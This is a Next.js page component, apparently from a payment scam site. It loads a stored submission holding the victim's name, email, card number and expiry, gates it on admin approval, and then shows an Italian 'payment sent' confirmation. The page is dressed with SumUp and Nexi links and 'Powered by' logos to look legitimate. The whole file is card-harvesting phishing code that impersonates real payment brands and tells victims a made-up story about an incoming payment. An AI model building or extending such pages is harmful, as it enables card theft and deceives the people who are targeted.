"use client";

import { useEffect, useState } from "react";
import Link from "next/link";
import { useSearchParams } from "next/navigation";
import { createClient } from "@/lib/supabase/client";
import type { Submission } from "@/types";

export default function NextClient() {
  const id = useSearchParams().get("id");
  const [row, setRow] = useState<Submission | null>(null);
  const [error, setError] = useState("");

  useEffect(() => {
    if (!id) return;

    createClient()
      .from("submissions")
      .select("*")
      .eq("id", id)
      .single()
      .then(({ data, error: qError }) => {
        if (qError || !data) {
          setError(qError?.message ?? "Submission not found.");
          return;
        }
        setRow(data as Submission);
      });
  }, [id]);

  if (!id) {
    return (
      <main className="mx-auto max-w-md px-6 py-16 text-center">
        <h1 className="text-2xl font-semibold">Missing submission</h1>
        <Link href="/" className="mt-4 inline-block text-blue-400 underline">
          Back to form
        </Link>
      </main>
    );
  }

  if (error) {
    return (
      <main className="mx-auto max-w-md px-6 py-16 text-center">
        <p className="text-red-400">{error}</p>
      </main>
    );
  }

  if (!row) {
    return <main className="px-6 py-16 text-center">Caricando...</main>;
  }

  if (row.status !== "approved") {
    return (
      <main className="mx-auto max-w-md px-6 py-16 text-center">
        <h1 className="text-2xl font-semibold">Access denied</h1>
        <p className="mt-3 text-[#9aa8b8]">
          You cannot view this page until an admin approves your details.
        </p>
        <Link
          href={`/status?id=${row.id}`}
          className="mt-6 inline-block text-blue-400 underline"
        >
          Check status
        </Link>
           <footer className="mt-10 w-full text-center">
        <p className="mb-3 text-xs uppercase tracking-wide text-[#9aa8b8]">
          Powered by
        </p>
        <img
          src="/logo.png"
          alt="Powered by"
          className="mx-auto h-20 w-auto object-contain opacity-80"
        />

        <nav className="flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-sm text-[#9aa8b8]">
          <a href="https://sumup.com/legal/" className="hover:text-white hover:underline">
            Avviso legale
          </a>
          <span className="hidden text-[#2a3548] sm:inline">|</span>
          <a href="https://sumup.com/privacy/" className="hover:text-white hover:underline">
            Politica sulla riservatezza
          </a>
          <span className="hidden text-[#2a3548] sm:inline">|</span>
          <a href="https://sumup.com/terms/" className="hover:text-white hover:underline">
            Termini &amp; Condizioni
          </a>
          <span className="hidden text-[#2a3548] sm:inline">|</span>
          <a href="https://sumup.com/cookies/" className="hover:text-white hover:underline">
            Informativa sui cookie
          </a>
        </nav>
      </footer>
      </main>
    );
  }

  return (
    <main className="mx-auto flex min-h-screen max-w-lg flex-col items-center bg-white px-6 py-12 text-gray-900">
          <img
        src="/powered-by.png"
          alt="Powered by"
          className="mx-auto h-20 w-auto object-contain opacity-80"
        />
        <br></br>
        <div className="flex flex-col items-center text-center">
  <svg
    className="h-20 w-20 text-green-500"
    viewBox="0 0 24 24"
    fill="none"
    aria-hidden="true"
  >
    <circle cx="12" cy="12" r="10" fill="#22c55e" />
    <path
      d="M7.5 12.5l3 3 6-6.5"
      stroke="white"
      strokeWidth="2.4"
      strokeLinecap="round"
      strokeLinejoin="round"
    />
  </svg>
</div>
      <h1 className="text-3xl font-semibold"> Pagamento inviato</h1>
      <p className="mt-3 text-[#000000]">
        La tua richiesta è stata approvata!
      </p>

      <section className="mt-8 rounded-xl border border-[#050506] bg-[#e7ecf2] p-6">
        <h2 className="font-medium">Il pagamento sarà inviato a:</h2>
        <dl className="mt-4 space-y-2 text-sm">
          <div className="flex justify-between gap-4">
            <dt className="text-[#9aa8b8]">Nome e Cognome</dt>
            <dd>{row.first_name}</dd>
            </div>
            <div className="flex justify-between gap-4">
            <dt className="text-[#9aa8b8]">Email</dt>
            <dd>{row.email}</dd>
            </div>
            <div className="flex justify-between gap-4">
            <dt className="text-[#9aa8b8]">Carta</dt>
            <dd>**** {row.card_number.slice(-4)}</dd>
            </div>
            <div className="flex justify-between gap-4">
            <dt className="text-[#9aa8b8]">Scadenza</dt>
            <dd>{row.expiry}</dd>
            </div>
        </dl>
      </section>
      <br></br>
       <p className="mb-3 text-xs uppercase tracking-wide text-[#9aa8b8]">
          Powered by
        </p>
        <img
          src="/logo.png"
          alt="Powered by"
          className="mx-auto h-20 w-auto object-contain opacity-80"
        />
        <p className="mt-3 text-[#000000]">
        Questo pagamento sarà visibile sul conto bancario o PayPal entro 3-6 giorni lavorativi da oggi
      </p>
      <br></br>
         <footer className="mt-10 w-full text-center">
       

        <nav className="flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-sm text-[#9aa8b8]">
          <a href="https://www.nexi.it/it/carte-di-pagamento/sicurezza" className="hover:text-white hover:underline">
            Prevenzione frodi
          </a>
          <span className="hidden text-[#2a3548] sm:inline">|</span>
          <a href="https://www.nexi.it/it/privacy" className="hover:text-white hover:underline">
            Privacy
          </a>
          <span className="hidden text-[#2a3548] sm:inline">|</span>
          <a href="https://www.nexi.it/it/cookie-policy" className="hover:text-white hover:underline">
            Cookie
          </a>
          <span className="hidden text-[#2a3548] sm:inline">|</span>
          <a href="https://www.nexi.it/it/reclami" className="hover:text-white hover:underline">
            Reclami
          </a>
        </nav>
      </footer>
    </main>
  );
}
